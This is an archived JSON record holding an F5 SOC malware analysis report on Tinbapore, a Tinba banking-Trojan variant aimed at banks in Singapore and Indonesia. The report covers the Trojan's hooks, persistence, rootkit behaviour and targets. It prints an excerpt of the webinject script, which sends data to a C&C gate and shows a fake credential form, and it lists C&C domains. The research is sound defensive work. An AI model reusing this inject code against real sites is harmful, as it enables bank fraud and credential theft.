{
    "id": "e0948666-faab-40af-b4a7-9d7269a7b208",
    "created_at": "2022-10-25T16:48:17.449444Z",
    "updated_at": "2025-03-27T02:05:49.609883Z",
    "deleted_at": null,
    "sha1_hash": "ba23484ae4d43db724584427b5628802e827dd1c",
    "title": "F5SOC_Tinbapore_Attack_011316_final",
    "authors": "",
    "file_creation_date": "2016-01-13T23:31:30Z",
    "file_modification_date": "2016-01-13T23:31:30Z",
    "file_size": 1159663,
    "plain_text": "MALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n###### MALWARE ANALYSIS REPORT\n\n# Tinbapore: Millions of Dollars at Risk\n\n#### January 2016 | F5 SOC\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n## Contents\n\n##### Contents ........................................................................................................................................................... 2\n\n The Threat ........................................................................................................................................................ 3\n\n About Tinba ...................................................................................................................................................... 4\n\n Tinbapore Malware Analysis Details ................................................................................................................ 5\n\n Webinject Analysis ........................................................................................................................................... 6\n\n WebSafe Detection of Tinbapore ..................................................................................................................... 7\n\n Tinbapore Targets ............................................................................................................................................ 8\n\n F5 Security Solutions ........................................................................................................................................ 9\n\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n## The Threat\n\n### Trojans\n\nA Trojan is a piece of malware that appears to the user to perform a desirable function but—perhaps in addition to the\n\nexpected function—steals information or harms the system. Trojans employ two main techniques to steal users’\n\ncredentials or initiate money transfers on their behalf:\n\n  - Modifying the website’s client-side web page.\n\n  - Sniffing the browser’s activity for information, such as that sent to different banks, before the packets are\n\nencrypted by SSL.\n\n### Script injections\n\nSeveral e-banking Trojans (such as Neverquest, Dyre, and Dridex) have used script injection techniques to modify the\n\noriginal web page. The modification may enable the attacker to perform money transactions using victims’ credentials.\n\nThis may be perpetrated by a Trojan injecting a malicious JavaScript code to the client’s browser, once the client is\n\nconnected to the website. The injected code may perform different functions, including attempting a money transfer from\n\nthe client’s account, gaining control on mobile devices, and much more.\n\nTo maintain the information sent by the Trojan, attackers have developed different types of command and control (C&C)\n\nsystems that enable them to grab and manage the Trojan. These systems are usually PHP-based systems\n\naccompanied by a SQL database.\n\n\nTinbapore: Millions of Dollars at Risk\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n## About Tinba                                  \n\nTinba, also known as Tinybanker, Zusy, and HµNT€R$, is a banking Trojan that was first seen in the wild around May\n\n2012. Its source code was leaked in July 2011, and since then it has evolved. Cybercriminals have customized the\n\nleaked code to create even more sophisticated pieces of malware that are being used to attack a large number of\n\npopular banking websites around the world. Until now, four new variants had been identified. Tinbapore is the fifth.\n\nThe original Tinba malware was written in the assembly programming language and was noted for its very small size\n\n(around 20 KB including all Webinjects and configuration). The malware mostly uses four system libraries during\n\nruntime: ntdll.dll, advapi32.dll, ws2_32.dll, and user32.dll. Its main functionality is hooking all the browsers on the\n\ninfected machine so it can intercept HTTP requests and perform web injections.\n\nNewer and improved versions of the malware employ a domain generation algorithm (DGA), which makes the malware\n\nmuch more persistent and gives it the ability to come back to life even after a command and control (C&C) server is\n\ntaken down. This new variant of Tinba, Tinbapore, now creates its own instance of explorer.exe that runs in the\n\nbackground. It differs from most previous versions in that it actively targets financial entities in the Asian Pacific (APAC),\n\nwhich was previously uncharted territory for Tinba.\n\nFigure 1: The Tinbapore attack flow\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n## Tinbapore Malware Analysis Details                           \n\nUpon execution, the malware initially infects the system by opening the winver.exe process—a legitimate Windows\n\napplet that shows the Windows version—injecting itself into it, and propagating into explorer.exe.\n\nThen, while operating through explorer.exe, the malware writes itself as a bin.exe file into the \\Application Data\\ folder\n\nwith a randomly generated subfolder.\n\n### System function hooks\n\nTinbapore gains control over the system by hooking several functions inside the ntdll.dll library. The hooked functions\n\nare NtCreateProcessEx, NtCreateThread, NtEnumerateValueKey, NtQueryDirectoryFile, and NtResumeThread.\n\nFigure 2: Functions hooked by Tinbapore\n\n### Auto-run entries\n\nIn order to stay persistent in the system, the malware writes two auto-run locations, making it start with Windows at\n\nboot. The auto-runs are written into the registry in both HKEY CURRENT_USER and HKEY_LOCAL_MACHINE registry\n\nhives, under the Software\\Microsoft\\Windows\\CurrentVersion\\Run key.\n\n### Deployment\n\nTinbapore writes deployed files into the \\Application Data\\ folder.\n\n  - **log.dat, ntf.dat—These are used to store the collected data from the infected machine before that data is sent**\n\nto the C&C server. These files are encrypted and removed right after being written.\n\n  - **bin.exe—This malware executable file is run on system boot.**\n\n  - **web.dat—This Webinject configuration file is written when downloaded from the C&C.**\n\n### Browser function hooks\n\nWhen a browser application is executed, the malware injects itself into the process and hooks wininet.dll library\n\nfunctions, which allows it to perform browser injections. The hooked functions are HttpQueryInfoA, HttpSendRequestA,\n\n_HttpSendRequestW, InternetCloseHandle, InternetQueryDataAvailable, InternetReadFile, and InternetReadFileExA._\n\nTinbapore also lowers security settings and sets the DisplayMixedContentInternet option to zero (0). This allows\n\nattackers to perform browser injections without prompting the user.\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\nFigure 3: Tinbapore sets security settings to zero\n\n### Rootkit\n\nThe malware is a rootkit, meaning that by hooking system functions, it has higher system privileges than the user, so it\n\ncan hide itself from the user’s eyes, making it impossible to remove manually. Special anti-rootkit tools, such as\n\nIceSword, are required to see the malware registry keys and files on disk.\n\nFigure 4: Tinbapore registry keys and files as they can be seen with IceSword\n\n## Webinject Analysis\n\nIn a departure from previous versions of Tinba, which usually did not target Asian financial entities, the new Tinbapore\n\nvariant does target financial institutions in Asia and the Pacific (as well as U.S. and European institutions). The largest\n\npercentage of the targeted entities are in Singapore.\n\nFigure 5: A Tinbapore partial ATS script targeting financial institutions in APAC\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\nThe injected script shown above in Figure 5 is part of Tinbapore’s Automatic Transfer Systems (ATS) engine injection\n\nmanagement system, which injects content into the victim’s browser and sends the logged information back to the ATS\n\nserver.\n\nAfter being injected into the victim’s browser, the script is then deleted to cover its tracks.\n\nvar wwww=\"ssl-chanel.ru\";\nvar blokss=\"ZZZ\";\nvar affid=\"xxxxxx\";\n\nvar home_link = \"https://\"+wwww+\"/az/atsbmid\";var gate_link =\nhome_link+\"/gate.php?obj=ST&q=\"+affid;var pkey = \"Bc5rw12\";\nvar waitlok=\"<div><br/><br/><br/><br/><center> Kami bekerja pada pemutakhiran database, sehingga\nlayanan ini sementara tidak tersedia.\n<br/>Kami akan mencoba untuk melanjutkan layanan sesegera mungkin. Silahkan coba lagi dalam\nbeberapa jam.<br/><br/><center></div>\";\nvar waitfkk=\"<table id=\\\"fkdiv\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" width=\\\"500\\\">\n<tbody><tr> <td width=\\\"500\\\">Verifikasi tambahan identitas</td> </tr><tr> <td width=\\\"500\\\">\nMasukkan alamat E-mail Anda yang terdaftar di system BANK NAME</td> </tr> <tr height=\\\"15\\\"> <td\nheight=\\\"15\\\" width=\\\"500\\\"></td> </tr> <tr> <td width=\\\"500\\\">\n<font color=\\\"#000090\\\" face=\\\"Verdana\\\" size=\\\"2\\\"><b>Silakan memasukkan alamat E-mail Internet\nBanking Anda</b></font></td> </tr> <tr> <td width=\\\"500\\\">\n<table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"> <tbody><tr height=\\\"2\\\"> <td\nbgcolor=\\\"#000090\\\" height=\\\"2\\\" width=\\\"350\\\"></td> </tr> </tbody></table> </td> </tr>\n<tr> <td width=\\\"500\\\"><font color=\\\"#ff9c00\\\" face=\\\"Verdana\\\" size=\\\"2\\\"><b>Please enter Your\nInternet Banking E-mail</b></font></td> </tr> <tr> <td width=\\\"500\\\">\n<input id=\\\"fkmail\\\" size=\\\"24\\\" type=\\\"text\\\"></td> </tr> <tr> <td width=\\\"500\\\"><input\nstyle=\\\"\\\" value=\\\"LOGIN\\\" id=\\\"fksend\\\" onmouseover=\\\"this.style.cursor='hand'\\\"\ntype=\\\"button\\\"></td> </tr> </tbody></table>\";\n\nFigure 6: The Tinbapore visual injection source code\n\nFor most of the targeted entities to date, injected content has shown the message in Figure 7 on the user’s machine\n\nwhile initiating the fraudulent activity. The Google translation for this message is “We are working on updating the\n\ndatabase, so that the service is temporarily unavailable. We will try to resume the service as soon as possible. Please\n\ntry again in a few hours.”\n\nKami bekerja pada pemutakhiran database, sehingga layanan ini sementara tidak tersedia.\n\nKami akan mencoba untuk melanjutkan layanan sesegera mungkin. Silahkan coba lagi dalam beberapa\njam.\n\nFigure 7: The Tinbapore visual injection as seen on the victim’s machine\n\n## WebSafe Detection of Tinbapore\n\nThe F5[®] WebSafe™ security solution detected the Tinbapore malware attack in real time, and the F5 Security\n\nOperations Center™ (SOC) took immediate action to shut down attack resources, although Tinbapore’s DGA\n\ncapabilities make the malware very persistent and give it the ability to come back to life even after a C&C server is taken\n\ndown.\n\n### Malicious URLs\n\nTinbapore resources detected by WebSafe and shut down by the SOC include the following malicious URLs:\n\n\nTinbapore: Millions of Dollars at Risk\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n  - hxxps://ssl-base.com\n\n  - hxxps://test-ssl.ru\n\n  - hxxps://data-chanel.ru\n\n  - hxxps://ssl-tree.ru\n\n  - hxxps://ssl-chanel.ru\n\n  - hxxps://ssl-temp.ru\n\n  - hxxps://temp-ssl.ru\n\n## Tinbapore Targets\n\nTo date, Singapore has been the country most targeted by the Tinbapore malware. It accounts for 30 percent of the\n\nattacked institutions known to the F5 SOC. Indonesian financial institutions also are at risk of losing millions of dollars,\n\nas another 20 percent of the targeted entities are based in this country.\n\nFigure 8: Tinbapore targeted entities by country\n\nFinancial institutions in APAC are not the only ones at risk; the malware has also targeted institutions in the Europe,\n\nMiddle East, and Africa (EMEA) region and the Americas. However, it is clear that the majority of attacks target financial\n\ninstitutions in Asia and the Pacific.\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\nFigure 9: Tinbapore targeted entities by region\n\n## F5 Security Solutions                                     \n\nF5 enables financial organizations working online to enhance security and gain control over areas that were once\n\nvirtually unreachable and indefensible, and to neutralize local threats found on customers’ personal computers, without\n\nrequiring the installation of software on the user side. This approach covers the entire install base. The entire solution is\n\ndelivered from the F5 BIG-IP[®] platform and therefore doesn’t require any integration or modification of the application.\n\nF5 products and services complement your existing anti-fraud technologies, improving your protection against malicious\n\nactivity and providing an encompassing defense mechanism. F5 products mitigate online identity theft by preventing\n\nphishing, malware, and pharming attacks in real time with advanced encryption and identification mechanisms.\n\nRounding out its offerings, F5 provides professional services and advanced research capabilities in the field of\n\ncybercrime, including malware, Trojans, viruses, and more.\n\n### About the F5 SOC\n\nF5 constantly monitors the fraud threat landscape, analyzing risks and trends that threaten online financial institutions.\n\nThe company’s SOC monitors global attack activities in real time, notifies customers of threats, and shuts down phishing\n\nproxies or drop zones to minimize the damages they can inflict. The SOC also:\n\n  - Houses an experienced team of security researchers and analysts who investigate new attacks throughout the\n\nworld.\n\n  - Works with F5 Labs to aggregate the latest security intelligence and provide customers with tools to help mitigate\n\nrisks.\n\n  - Maintains up-to-date information on the latest malware, zero-day exploits, and phishing attacks that target the\n\nfinancial services industry.\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\nThe SOC supplements F5 WebSafe and MobileSafe™ solutions for protecting online applications or URLs. SOC\n\nservices bring visibility to, and protection against, the mounting risks of advanced financial fraud. These services also\n\nextend corporate fraud and security teams with additional, expert assistance.\n\n### About F5 Labs\n\nF5 Labs compiles security research, market research, and intelligence from F5 platform security, the F5 security\n\nincident response team (SIRT), SOC product development, and F5 iHealth® monitoring service data to provide\n\ncustomers with actionable information on the latest threats, risks, and application vulnerabilities.\n\nTo learn more about F5 fraud protection, read the WebSafe datasheet as well as the MobileSafe datasheet.\n\nTo learn more about F5 Security Operations Center, read the F5 SOC datasheet.\n\n\nTinbapore: Millions of Dollars at Risk\n\n\n-----\n\nMALWARE ANALYSIS REPORT\nTinbapore: Millions of Dollars at Risk\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.01.29.Tinbapore_Attack/F5SOC_Tinbapore_Attack_January2016_29.pdf"
    ],
    "report_names": [
        "F5SOC_Tinbapore_Attack_January2016_29"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1452727890,
    "ts_modification_date": 1452727890,
    "files": {
        "pdf": "https://archive.orkl.eu/ba23484ae4d43db724584427b5628802e827dd1c.pdf",
        "text": "https://archive.orkl.eu/ba23484ae4d43db724584427b5628802e827dd1c.txt",
        "img": "https://archive.orkl.eu/ba23484ae4d43db724584427b5628802e827dd1c.jpg"
    }
}